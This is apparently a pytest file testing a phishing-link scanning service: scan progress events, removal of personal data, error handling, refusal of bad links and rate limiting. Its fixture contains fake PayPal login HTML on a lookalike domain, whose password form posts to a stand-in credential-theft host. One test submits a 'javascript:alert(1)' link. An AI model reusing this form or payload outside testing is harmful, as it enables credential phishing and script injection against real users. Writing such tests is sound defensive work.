"""Live-progress scans: start, follow the events, reopen the saved result. The sandbox and recon
are fakes, and the database is the in-memory stand-in from conftest.py."""

import json

import pytest
from fastapi.testclient import TestClient

from app import recon, sandbox_client
from app.config import Settings, get_settings
from app.main import app
from app.recon.models import Recon, Registration

VISIT = {
    "requested_url": "https://paypa1.com/signin?email=someone@example.com",
    "final_url": "https://paypa1.com/signin?email=someone@example.com",
    "hops": [{"url": "https://paypa1.com/signin?email=someone@example.com", "kind": "start", "status": 200}],
    "contacted_domains": ["paypa1.com"],
    "blocked": [],
    "screenshot_jpeg_b64": "aGVsbG8=",
    "html": (
        "<title>PayPal</title><form action='https://steal.example.net/x'><input type=password name=pw></form>"
    ),
    "stopped": None,
}


@pytest.fixture
def fakes(monkeypatch):
    async def fake_visit(sandbox_url, url):
        return json.loads(json.dumps(VISIT))

    async def fake_recon(visit, url):
        return Recon(
            host="paypa1.com",
            registered_domain="paypa1.com",
            registration=Registration(domain="paypa1.com", age_days=2),
        )

    monkeypatch.setattr(sandbox_client, "visit", fake_visit)
    monkeypatch.setattr(recon, "run_recon", fake_recon)


def events(client: TestClient, scan_id: str) -> list[tuple[str, dict]]:
    out = []
    with client.stream("GET", f"/scans/{scan_id}/events") as resp:
        assert resp.headers["content-type"].startswith("text/event-stream")
        kind = None
        for line in resp.iter_lines():
            if line.startswith("event: "):
                kind = line[7:]
            elif line.startswith("data: "):
                out.append((kind, json.loads(line[6:])))
    return out


def test_scan_progress_streams_every_step_then_the_result(fakes, fake_storage):
    with TestClient(app) as client:
        started = client.post("/scans", json={"url": "paypa1.com/signin?email=someone@example.com"})
        assert started.status_code == 202
        scan_id = started.json()["id"]
        assert [s["id"] for s in started.json()["steps"]] == ["sandbox", "recon", "analysis", "save"]

        got = events(client, scan_id)
        steps = [(d["step"], d["status"]) for k, d in got if k == "step"]
        assert steps == [
            ("sandbox", "running"),
            ("sandbox", "done"),
            ("recon", "running"),
            ("recon", "done"),
            ("analysis", "running"),
            ("analysis", "done"),
            ("save", "running"),
            ("save", "done"),
        ]
        sandbox_done = next(
            d for k, d in got if k == "step" and d["step"] == "sandbox" and d["status"] == "done"
        )
        assert "screenshot_jpeg_b64" not in sandbox_done["data"]  # previews stay small
        kind, result = got[-1]
        assert kind == "done"
        assert result["analysis"]["verdict"] in ("suspicious", "dangerous")
        assert "html" not in result["visit"]


def test_reopened_results_have_personal_data_removed(fakes, fake_storage):
    link = "paypa1.com/signin?email=someone@example.com"
    with TestClient(app) as client:
        scan_id = client.post("/scans", json={"url": link}).json()["id"]
        live = events(client, scan_id)[-1][1]
        again = client.get(f"/scans/{scan_id}")
    # The person who ran the scan sees the link as pasted; anyone reopening it sees it cleaned.
    assert "someone@example.com" in live["url"]
    assert again.status_code == 200
    assert "someone@example.com" not in json.dumps(again.json())
    assert scan_id in fake_storage


def test_sandbox_problems_arrive_as_a_plain_error_event(monkeypatch):
    async def down(sandbox_url, url):
        raise sandbox_client.SandboxUnavailable

    monkeypatch.setattr(sandbox_client, "visit", down)
    with TestClient(app) as client:
        scan_id = client.post("/scans", json={"url": "example.com"}).json()["id"]
        kind, data = events(client, scan_id)[-1]
    assert kind == "error"
    assert "isn't running" in data["message"]


def test_a_failed_save_still_delivers_the_result(fakes, monkeypatch):
    from app import storage

    async def broken(database_url, result):
        raise ConnectionError("db down")

    monkeypatch.setattr(storage, "save", broken)
    with TestClient(app) as client:
        scan_id = client.post("/scans", json={"url": "paypa1.com"}).json()["id"]
        got = events(client, scan_id)
    assert ("save", "failed") in [(d["step"], d["status"]) for k, d in got if k == "step"]
    assert got[-1][0] == "done"


def test_bad_links_are_refused_before_any_job_starts(fakes):
    with TestClient(app) as client:
        resp = client.post("/scans", json={"url": "javascript:alert(1)"})
    assert resp.status_code == 400


def test_unknown_or_malformed_ids_give_404():
    with TestClient(app) as client:
        assert client.get("/scans/not-a-uuid").status_code == 404
        assert client.get("/scans/00000000-0000-0000-0000-000000000000").status_code == 404


def test_rate_limit(fakes):
    app.dependency_overrides[get_settings] = lambda: Settings(_env_file=None, scan_rate_limit_per_hour=2)
    try:
        with TestClient(app) as client:
            codes = [client.post("/scans", json={"url": "paypa1.com"}).status_code for _ in range(3)]
            refused = client.post("/scan", json={"url": "paypa1.com"})
    finally:
        app.dependency_overrides.clear()
    assert codes == [202, 202, 429]
    assert refused.status_code == 429
    assert "Too many scans" in refused.json()["detail"]
